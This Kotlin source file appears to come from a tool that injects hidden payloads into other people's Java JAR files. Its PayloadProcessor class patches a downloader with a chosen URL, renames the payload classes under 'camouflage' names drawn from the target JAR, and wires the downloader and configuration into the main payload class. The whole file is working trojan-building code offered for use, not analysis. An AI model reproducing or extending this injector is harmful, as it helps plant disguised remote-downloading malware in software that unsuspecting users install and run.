package com.tmquan2508.inject.core.payload

import com.rikonardo.cafebabe.ClassFile
import com.tmquan2508.inject.config.Config
import com.tmquan2508.inject.core.analysis.JavaVersion
import com.tmquan2508.inject.core.payload.transformation.ConfigurationInjector
import com.tmquan2508.inject.core.payload.transformation.DownloaderPatcher
import com.tmquan2508.inject.core.payload.transformation.PayloadRelocator
import com.tmquan2508.inject.log.BDLogger
import java.io.File

data class ProcessedPayload(
    val otherClasses: List<ClassFile>,
    val finalMainPayloadName: String,
    val finalMainPayloadBytes: ByteArray
)

class PayloadProcessor(private val logger: BDLogger) {
    private val downloaderPatcher = DownloaderPatcher(logger)
    private val camouflageGenerator = Camouflage(logger)
    private val payloadRelocator = PayloadRelocator(camouflageGenerator, logger)
    private val configurationInjector = ConfigurationInjector(logger)

    fun process(
        rawPayloadClasses: List<ClassFile>,
        camouflageEnabled: Boolean,
        targetJar: File,
        dominantVersion: JavaVersion,
        config: Config,
        configJson: String,
        downloaderUrl: String
    ): ProcessedPayload {
        val patchedDownloaderBytes = downloaderPatcher.patchUrl(downloaderUrl)

        val (relocationMap, finalMainPayloadName) = payloadRelocator.createRelocationPlan(
            camouflageEnabled, targetJar, rawPayloadClasses
        )
        val transformedBytecodeMap = payloadRelocator.transformAndRelocate(
            rawPayloadClasses, relocationMap, dominantVersion
        )

        val configuredBytecodeMap = configurationInjector.apply(
            originalBytecodeMap = transformedBytecodeMap,
            targetClassName = finalMainPayloadName,
            downloaderBytes = patchedDownloaderBytes,
            config = config,
            configJson = configJson
        )

        val finalMainPayloadBytes = configuredBytecodeMap[finalMainPayloadName]
            ?: throw IllegalStateException("Main payload class '$finalMainPayloadName' not found after configuration.")

        val otherClasses = configuredBytecodeMap
            .filterKeys { it != finalMainPayloadName }
            .map { (name, bytes) -> ClassFile(bytes).apply { this.name = name } }

        return ProcessedPayload(otherClasses, finalMainPayloadName, finalMainPayloadBytes)
    }
}